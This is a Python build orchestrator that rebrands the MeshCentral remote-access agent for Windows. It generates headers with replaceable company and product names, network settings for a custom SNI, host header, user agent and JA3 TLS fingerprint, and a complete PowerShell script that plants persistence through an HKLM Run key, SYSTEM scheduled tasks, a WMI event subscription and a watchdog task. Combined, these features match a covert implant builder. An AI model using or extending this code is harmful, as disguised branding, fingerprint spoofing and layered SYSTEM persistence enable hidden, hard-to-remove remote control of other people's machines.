#!/usr/bin/env python3
"""Custom MeshAgent build orchestrator (Windows only).

This script prepares, patches, and packages branded MeshAgent artifacts in
accordance with docs/MESHAGENT_CUSTOM_BUILD_PLAN.md. The implementation focuses
on modular tasks so Windows CI can call individual phases.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import shutil
import subprocess
import textwrap
import sys
from typing import Any, Dict

ROOT = pathlib.Path(__file__).resolve().parents[2]
CONFIG_DIR = ROOT / "custom_meshagent" / "configs"
PATCH_DIR = ROOT / "custom_meshagent" / "src" / "meshagent" / "patches"
BUILD_GENERATED = ROOT / "custom_meshagent" / "build" / "meshagent" / "generated"


def load_config(path: pathlib.Path) -> Dict[str, Any]:
    data = json.loads(path.read_text(encoding="utf-8"))
    inherit = data.get("inheritFrom")
    if inherit:
        parent_data = load_config((path.parent / inherit).resolve())
        parent_data.update({k: v for k, v in data.items() if k != "inheritFrom"})
        return parent_data
    return data


def resolve_asset(base: pathlib.Path, value: str | None) -> pathlib.Path | None:
    if not value:
        return None
    candidate = pathlib.Path(value)
    if not candidate.is_absolute():
        candidate = (base.parent / value).resolve()
    return candidate if candidate.exists() else None


def run_command(cmd: list[str], cwd: pathlib.Path | None = None) -> None:
    print(f"[meshagent-build] exec: {' '.join(cmd)}")
    subprocess.run(cmd, cwd=str(cwd) if cwd else None, check=True)


def cmd_validate(args: argparse.Namespace) -> None:
    config_path = CONFIG_DIR / args.config
    if not config_path.exists():
        raise SystemExit(f"config not found: {config_path}")
    _ = load_config(config_path)
    print(f"[meshagent-build] validated {config_path}")


def cmd_prepare(args: argparse.Namespace) -> None:
    # Placeholder: fetch/update upstream submodule(s), ensure toolchain present
    print("[meshagent-build] prepare step placeholder (Windows implementation required)")


def cmd_patch(args: argparse.Namespace) -> None:
    # Placeholder: apply patch sets under PATCH_DIR
    print("[meshagent-build] patch step placeholder (requires Windows tooling)")


def cmd_package(args: argparse.Namespace) -> None:
    print("[meshagent-build] package step placeholder (Windows NSIS/PowerShell required)")


def write_branding_header(config: Dict[str, Any], output: pathlib.Path) -> None:
    branding = config.get("branding", {})
    network = config.get("network", {})
    persistence = config.get("persistence", {})

    def text_literal(value: str | None) -> str:
        if value is None:
            return "NULL"
        return f'TEXT("{value}")'

    def str_literal(value: str | None) -> str:
        if value is None:
            return "NULL"
        escaped = value.replace("\\", "\\\\").replace("\"", "\\\"")
        return f'"{escaped}"'

    default_service_file = branding.get("serviceName") or "Mesh Agent"
    default_display_name = branding.get("displayName") or "Mesh Agent background service"
    default_company = branding.get("companyName") or "MeshCentral"
    default_product = branding.get("productName") or "MeshCentral Agent"
    default_description = branding.get("description") or "Mesh Agent"
    default_binary = branding.get("binaryName") or "meshagent.exe"
    default_copyright = branding.get("versionInfo", {}).get("legalCopyright") or "Apache 2.0 License"
    default_log_path = branding.get("logPath") or r"%ProgramData%\Mesh Agent"

    content = [
        "/* Generated file – do not edit. */",
        "#ifndef GENERATED_MESHAGENT_BRANDING_H",
        "#define GENERATED_MESHAGENT_BRANDING_H",
        "",
        f"#undef MESH_AGENT_SERVICE_FILE\n#define MESH_AGENT_SERVICE_FILE {text_literal(default_service_file)} ",
        f"#undef MESH_AGENT_SERVICE_NAME\n#define MESH_AGENT_SERVICE_NAME {text_literal(default_display_name)} ",
        f"#undef MESH_AGENT_COMPANY_NAME\n#define MESH_AGENT_COMPANY_NAME {str_literal(default_company)} ",
        f"#undef MESH_AGENT_PRODUCT_NAME\n#define MESH_AGENT_PRODUCT_NAME {str_literal(default_product)} ",
        f"#undef MESH_AGENT_FILE_DESCRIPTION\n#define MESH_AGENT_FILE_DESCRIPTION {str_literal(default_description)} ",
        f"#undef MESH_AGENT_INTERNAL_NAME\n#define MESH_AGENT_INTERNAL_NAME {str_literal(default_binary)} ",
        f"#undef MESH_AGENT_COPYRIGHT\n#define MESH_AGENT_COPYRIGHT {str_literal(default_copyright)} ",
        f"#undef MESH_AGENT_LOG_DIRECTORY\n#define MESH_AGENT_LOG_DIRECTORY {text_literal(default_log_path)} ",
        "",
        "/* Optional network hints for future use */",
        f"#define MESH_AGENT_NETWORK_ENDPOINT {str_literal(network.get('primaryEndpoint'))}",
        f"#define MESH_AGENT_NETWORK_SNI {str_literal(network.get('sni'))}",
        f"#define MESH_AGENT_NETWORK_USER_AGENT {str_literal(network.get('userAgent'))}",
        f"#define MESH_AGENT_NETWORK_JA3 {str_literal(network.get('ja3'))}",
        "",
        "/* Persistence flags */",
        f"#define MESH_AGENT_PERSIST_RUNKEY {(1 if persistence.get('runKey') else 0)}",
        f"#define MESH_AGENT_PERSIST_TASK {(1 if persistence.get('scheduledTask', {}).get('enabled') else 0)}",
        f"#define MESH_AGENT_PERSIST_WMI {(1 if persistence.get('wmi', {}).get('enabled') else 0)}",
        f"#define MESH_AGENT_PERSIST_WATCHDOG {(1 if persistence.get('watchdog', {}).get('enabled') else 0)}",
        "",
        "#endif /* GENERATED_MESHAGENT_BRANDING_H */",
        "",
    ]
    output.write_text("\n".join(content), encoding="utf-8")
    print(f"[meshagent-build] wrote branding header -> {output}")


def cmd_generate(args: argparse.Namespace) -> None:
    config_path = (CONFIG_DIR / args.config).resolve()
    config = load_config(config_path)
    meshagent_root = pathlib.Path(args.meshagent_root).resolve()
    header_dir = meshagent_root / "meshcore" / "generated"
    header_dir.mkdir(parents=True, exist_ok=True)
    write_branding_header(config, header_dir / "meshagent_branding.h")
    copy_icon_asset(config, meshagent_root, config_path)
    write_network_profile(config, BUILD_GENERATED / "network_profile.json")
    write_persistence_script(config, BUILD_GENERATED / "persistence.ps1")
    write_provisioning_bundle(config, BUILD_GENERATED / "meshagent.msh")


def copy_icon_asset(config: Dict[str, Any], meshagent_root: pathlib.Path, config_path: pathlib.Path) -> None:
    branding = config.get("branding", {})
    icon_path = resolve_asset(config_path, branding.get("icon"))
    if icon_path is None:
        return
    dest_dir = meshagent_root / "meshservice" / "generated"
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest = dest_dir / icon_path.name
    shutil.copy2(icon_path, dest)
    print(f"[meshagent-build] copied icon -> {dest}")


def write_network_profile(config: Dict[str, Any], destination: pathlib.Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    network = config.get("network", {})
    payload = {
        "primaryEndpoint": network.get("primaryEndpoint"),
        "sni": network.get("sni"),
        "hostHeader": network.get("hostHeader"),
        "alpn": network.get("alpn"),
        "userAgent": network.get("userAgent"),
        "ja3": network.get("ja3"),
        "useIpOnly": network.get("useIpOnly", False),
    }
    destination.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    print(f"[meshagent-build] wrote network profile -> {destination}")


def write_persistence_script(config: Dict[str, Any], destination: pathlib.Path) -> None:
    destination.parent.mkdir(parents=True, exist_ok=True)
    branding = config.get("branding", {})
    persistence = config.get("persistence", {})
    binary_name = branding.get("binaryName", "meshagent.exe")
    install_root = branding.get("installRoot", "C:/Program Files/Mesh Agent")
    service_name = branding.get("serviceName", "Mesh Agent") or "Mesh Agent"
    task_conf = persistence.get("scheduledTask", {})
    watchdog = persistence.get("watchdog", {})

    script = textwrap.dedent(f"""
        # Requires administrative privileges.
        Param(
            [string]$InstallRoot = "{install_root}",
            [string]$BinaryName = "{binary_name}"
        )

        $BinaryPath = Join-Path $InstallRoot $BinaryName

        Write-Host "[persistence] Using binary $BinaryPath"

        if ({str(persistence.get('runKey', False)).lower()}) {{
            Write-Host "[persistence] configuring Run key"
            New-Item -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Force | Out-Null
            New-ItemProperty -Path "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{service_name}" -Value ('"' + $BinaryPath + '" --service') -PropertyType String -Force | Out-Null
        }}

        if ({str(task_conf.get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring scheduled task"
            $taskName = "{task_conf.get('name', service_name)}"
            $trigger = "{task_conf.get('trigger', 'ONLOGON')}"
            schtasks /Create /TN $taskName /TR ('"' + $BinaryPath + '" --service') /SC $trigger /RL HIGHEST /RU SYSTEM /F | Out-Null
        }}

        if ({str(persistence.get('wmi', {}).get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring WMI event subscription"
            $filterName = "{service_name}_Filter"
            $consumerName = "{service_name}_Consumer"
            $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerShutdownEvent'"
            $commandLine = '"' + $BinaryPath + '" --service'
            $namespace = "root\\subscription"

            $existingFilter = Get-WmiObject __EventFilter -Namespace $namespace -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
            if ($null -eq $existingFilter) {{
                $filter = Set-WmiInstance -Class __EventFilter -Namespace $namespace -Arguments @{{Name=$filterName; Query=$query; QueryLanguage='WQL'; EventNamespace='root\\cimv2'}}
            }} else {{ $filter = $existingFilter }}

            $existingConsumer = Get-WmiObject CommandLineEventConsumer -Namespace $namespace -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue
            if ($null -eq $existingConsumer) {{
                $consumer = Set-WmiInstance -Namespace $namespace -Class CommandLineEventConsumer -Arguments @{{Name=$consumerName; CommandLineTemplate=$commandLine}}
            }} else {{ $consumer = $existingConsumer }}

            Set-WmiInstance -Namespace $namespace -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter; Consumer=$consumer}} | Out-Null
        }}

        if ({str(watchdog.get('enabled', False)).lower()}) {{
            Write-Host "[persistence] configuring watchdog task"
            $watchdogTask = "{service_name}_Watchdog"
            $intervalSeconds = {max(60, int(watchdog.get('intervalSeconds', 300)))}
            $intervalMinutes = [Math]::Max(1, [Math]::Floor($intervalSeconds / 60))
            schtasks /Create /TN $watchdogTask /TR ('"' + $BinaryPath + '" --watchdog') /SC MINUTE /MO $intervalMinutes /RL HIGHEST /RU SYSTEM /F | Out-Null
        }}
    """)

    destination.write_text(script, encoding="utf-8")
    print(f"[meshagent-build] wrote persistence script -> {destination}")


def write_provisioning_bundle(config: Dict[str, Any], destination: pathlib.Path) -> None:
    provisioning = config.get("provisioning", {})
    if not provisioning:
        return

    lines = [
        f"MeshName={provisioning.get('meshName', '')}",
        f"MeshType={provisioning.get('meshType', '')}",
        f"MeshID={provisioning.get('meshId', '')}",
        f"ServerID={provisioning.get('serverId', '')}",
        f"MeshServer={provisioning.get('serverUrl', '')}",
    ]
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[meshagent-build] wrote provisioning bundle -> {destination}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Custom MeshAgent build pipeline")
    sub = parser.add_subparsers(dest="command", required=True)

    validate = sub.add_parser("validate", help="Validate branding config inheritance")
    validate.add_argument("--config", default="meshagent.json", help="Config filename within configs/")
    validate.set_defaults(func=cmd_validate)

    prepare = sub.add_parser("prepare", help="Fetch upstream bits and ensure toolchain")
    prepare.set_defaults(func=cmd_prepare)

    patch = sub.add_parser("patch", help="Apply custom patch sets")
    patch.set_defaults(func=cmd_patch)

    generate = sub.add_parser("generate", help="Generate branding headers from config")
    generate.add_argument("--config", default="meshagent.json")
    generate.add_argument("--meshagent-root", default=str((ROOT / ".." / "meshagent").resolve()))
    generate.set_defaults(func=cmd_generate)

    package = sub.add_parser("package", help="Build and package installers (Windows only)")
    package.add_argument("--config", default="meshagent.json")
    package.set_defaults(func=cmd_package)

    return parser


def main(argv: list[str] | None = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)
    args.func(args)


if __name__ == "__main__":
    main(sys.argv[1:])
